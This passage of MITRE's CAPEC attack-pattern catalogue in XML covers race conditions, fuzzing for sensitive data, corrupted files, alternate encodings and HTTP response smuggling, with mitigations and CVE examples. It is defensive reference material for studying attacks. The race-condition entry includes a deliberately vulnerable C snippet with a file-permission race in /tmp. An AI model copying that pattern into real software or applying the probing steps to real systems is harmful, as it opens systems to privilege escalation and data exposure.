            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-614" Section="Testing for Remote File Inclusion" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Prerequisites, Description Summary, Related_Weaknesses, Solutions_and_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="26" Name="Leveraging Race Conditions" Abstraction="Meta" Status="Stable">
         <ns0:Description>The adversary targets a race condition occurring when multiple processes access and manipulate the same resource concurrently, and the outcome of the execution depends on the particular order in which the access takes place. The adversary can leverage a race condition by "running the race", modifying the resource and modifying the normal execution flow. For instance, a race condition can occur while accessing a file: the adversary can trick the system by replacing the original file with their version and cause the system to read the malicious file.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>The adversary explores to gauge what level of access they have.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>The adversary gains access to a resource on the target host. The adversary modifies the targeted resource. The resource's value is used to determine the next normal execution action.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>The resource is modified/checked concurrently by multiple processes. By using one of the processes, the adversary is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the adversary to abuse the target host.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>A resource is accessed/modified concurrently by multiple processes such that a race condition exists.</ns0:Prerequisite>
            <ns0:Prerequisite>The adversary has the ability to modify the resource.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">Being able to "run the race" requires basic knowledge of concurrent processing including synchonization techniques.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Use safe libraries to access resources such as files.</ns0:Mitigation>
            <ns0:Mitigation>Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.</ns0:Mitigation>
            <ns0:Mitigation>Use synchronization to control the flow of execution.</ns0:Mitigation>
            <ns0:Mitigation>Use static analysis tools to find race conditions.</ns0:Mitigation>
            <ns0:Mitigation>Pay attention to concurrency problems related to the access of resources.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057</ns0:Example>
            <ns0:Example>
               <html:p>The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an attacker can replace the file referenced by the name (see [REF-107]).</html:p>
               <html:div style="margin-left:1em;" class="informative">include &lt;sys/types.h&gt;<html:br />include &lt;fcntl.h&gt;<html:br />include &lt;unistd.h&gt;<html:br />
                  <html:br />define FILE "/tmp/myfile"<html:br />define UID 100<html:br />
                  <html:br />void test(char *str)<html:br />{<html:div style="margin-left:1em;">int fd;<html:br />fd = creat(FILE, 0644);<html:br />if(fd == -1)<html:div style="margin-left:1em;">return;</html:div>
                     <html:br />chown(FILE, UID, -1); /* BAD */<html:br />close(fd);</html:div>
                  <html:br />}<html:br />
                  <html:br />int main(int argc, char **argv)<html:br />{<html:div style="margin-left:1em;">char *userstr;<html:br />if(argc &gt; 1) {<html:div style="margin-left:1em;">userstr = argv[1];<html:br />test(userstr);</html:div>
                     <html:br />}<html:br />return 0;</html:div>
                  <html:br />}</html:div>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="368" />
            <ns0:Related_Weakness CWE_ID="363" />
            <ns0:Related_Weakness CWE_ID="366" />
            <ns0:Related_Weakness CWE_ID="370" />
            <ns0:Related_Weakness CWE_ID="362" />
            <ns0:Related_Weakness CWE_ID="662" />
            <ns0:Related_Weakness CWE_ID="689" />
            <ns0:Related_Weakness CWE_ID="667" />
            <ns0:Related_Weakness CWE_ID="665" />
            <ns0:Related_Weakness CWE_ID="1223" />
            <ns0:Related_Weakness CWE_ID="1254" />
            <ns0:Related_Weakness CWE_ID="1298" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
            <ns0:Reference External_Reference_ID="REF-105" Section="Race condition" />
            <ns0:Reference External_Reference_ID="REF-106" />
            <ns0:Reference External_Reference_ID="REF-107" Section="Test Case ID 1598" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Type (Relationship -&gt; Attack_Pattern)</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Examples-Instances, References, Solutions_and_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Execution_Flow, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="261" Name="Fuzzing for garnering other adjacent user/sensitive data" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An adversary who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>Many client applications use specific query templates when interacting with a server and often automatically fill in specific fields or attributes. If the server does not verify that the query matches one of the expected templates, an adversary who is allowed to send normal queries could modify their query to try to return additional information. The adversary may not know the names of fields to request or how other modifications will affect the server response, but by attempting multiple plausible variants, they might eventually trigger a server response that divulges sensitive information. Other possible outcomes include server crashes and resource consumption if the unexpected queries cause the server to enter an unstable state or perform excessive computation.</html:p>
         </ns0:Extended_Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="54" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.</ns0:Description>
               <ns0:Technique>Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.</ns0:Technique>
               <ns0:Technique>Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.</ns0:Technique>
               <ns0:Technique>Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.</ns0:Description>
               <ns0:Technique>Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).</ns0:Technique>
               <ns0:Technique>Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that either provide user/sensitive data or give information about an expected template that could be used to produce this data.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Craft exploit payloads] If the logs did not reveal any user/sensitive data, an adversary will attempt to make the fuzzing inputs form to an expected template</ns0:Description>
               <ns0:Technique>Create variants of expected templates that request additional information</ns0:Technique>
               <ns0:Technique>Create variants that exclude limiting clauses</ns0:Technique>
               <ns0:Technique>Create variants that alter fields taht identify the requester in order to subvert access controls</ns0:Technique>
               <ns0:Technique>Repeat different fuzzing variants until sensitive information is divulged</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The server must assume that the queries it receives follow specific templates and/or have fields or attributes that follow specific procedures. The server must process queries that it receives without adequately checking or sanitizing queries to ensure they follow these templates.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>A client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. For this example, additional information might include social security numbers or salaries.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="263" Name="Force Use of Corrupted Files" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This describes an attack where an application is forced to use a file that an attacker has corrupted. The result is often a denial of service caused by the application being unable to process the corrupted file, but other results, including the disabling of filters or access controls (if the application fails in an unsafe way rather than failing by locking down) or buffer overflows are possible.</ns0:Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="17" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The targeted application must utilize a configuration file that an attacker is able to corrupt. In some cases, the attacker must be able to force the (re-)reading of the corrupted file if the file is normally only consulted at startup.</ns0:Prerequisite>
            <ns0:Prerequisite>The severity of the attack hinges on how the application responds to the corrupted file. If the application detects the corruption and locks down, this may result in the denial of services provided by the application. If the application fails to detect the corruption, the result could be a more severe denial of service (crash or hang) or even an exploitable buffer overflow. If the application detects the corruption but fails in an unsafe way, this attack could result in the continuation of services but without certain security structures, such as filters or access controls. For example, if the corrupted file configures filters, an unsafe response from an application could result in simply disabling the filtering mechanisms due to the lack of usable configuration data.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any).</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="267" Name="Leverage Alternate Encoding" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="153" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
               <ns0:Technique>Manually inspect the application to find entry points.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the "Explore" phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.</ns0:Description>
               <ns0:Technique>Try to use different encodings of content in order to bypass validation routines.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An adversary can inject different representation of a filtered character in a different encoding.</ns0:Skill>
            <ns0:Skill Level="Medium">An adversary may craft subtle encoding of input data by using the knowledge that they have gathered about the target host.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Accountability</ns0:Scope>
               <ns0:Scope>Authentication</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Scope>Non-Repudiation</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>Denial of Service</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)</ns0:Mitigation>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified "encoding strings," which allows remote adversaries to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka "Post Encoding Information Disclosure Vulnerability." Related Vulnerabilities CVE-2010-0488</ns0:Example>
            <ns0:Example>Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="172" />
            <ns0:Related_Weakness CWE_ID="180" />
            <ns0:Related_Weakness CWE_ID="181" />
            <ns0:Related_Weakness CWE_ID="73" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="692" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1027</ns0:Entry_ID>
               <ns0:Entry_Name>Obfuscated Files or Information</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-108" Section="WASC-20 - Improper Input Handling" />
            <ns0:Reference External_Reference_ID="REF-109" Section="Category: Encoding" />
            <ns0:Reference External_Reference_ID="REF-110" Section="Canonicalization, locale and Unicode" />
            <ns0:Reference External_Reference_ID="REF-69" Section="XSS (Cross Site Scripting) Prevention Cheat Sheet" />
            <ns0:Reference External_Reference_ID="REF-112" Section="Chapter 5 Section 9: Character Encoding" />
            <ns0:Reference External_Reference_ID="REF-113" Section="Character encoding" />
            <ns0:Reference External_Reference_ID="REF-114" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description Summary, Examples-Instances, References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations, Skills_Required, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Execution_Flow, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="273" Name="HTTP Response Smuggling" Abstraction="Detailed" Status="Stable">
         <ns0:Description>
            <html:p>An adversary manipulates and injects malicious content in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., server).</html:p>
            <html:p>See CanPrecede relationships for possible consequences.</html:p>
         </ns0:Description>
         <ns0:Extended_Description>
            <html:p>In the maliciously manipulated HTTP response, an adversary can add duplicate header fields that HTTP agents interpret as belonging to separate responses.</html:p>
            <html:p>The combined HTTP response ends up being parsed or interpreted as two or more HTTP responses by the targeted client HTTP agent. This allows malicious HTTP responses to bypass security controls. This is performed by the abuse of interpretation and parsing discrepancies in different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) or client HTTP agents (e.g., web browser) in the path of the malicious HTTP responses.</html:p>
            <html:p>This attack usually involves the misuse of the HTTP headers: Content-Length and Transfer-Encoding. These abuses are discussed in RFC 2616 #4.4.3 and section #4.2 and are related to ordering and precedence of these headers. [REF-38]</html:p>
            <html:p>Additionally this attack can be performed through modification and/or fuzzing of parameters composing the request-line of HTTP messages.</html:p>
            <html:p>This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions in the HTTP agents.</html:p>
            <html:p>This differs from CAPEC-33 HTTP Request Smuggling, which is usually an attempt to compromise a back-end HTTP agent via HTTP Request messages. HTTP Response Smuggling is an attempt to compromise a<html:i>client agent (e.g., web browser)</html:i>.</html:p>
            <html:p>HTTP Splitting (CAPEC-105 and CAPEC-34) is different from HTTP Smuggling due to the fact that during implementation of asynchronous requests, HTTP Splitting requires the embedding/injection of arbitrary HTML headers and content through user input into browser cookies or Ajax web/browser object parameters like XMLHttpRequest.</html:p>
         </ns0:Extended_Description>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>HTTP Desync</ns0:Term>
               <ns0:Description>Modification/manipulation of HTTP message headers, request-line and body parameters to disrupt and interfere in the interpretation and parsing of HTTP message lengths/boundaries for consecutive HTTP messages by HTTP agents in a HTTP chain or network path.</ns0:Description>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="220" />
            <ns0:Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="33" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="115" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="141" />
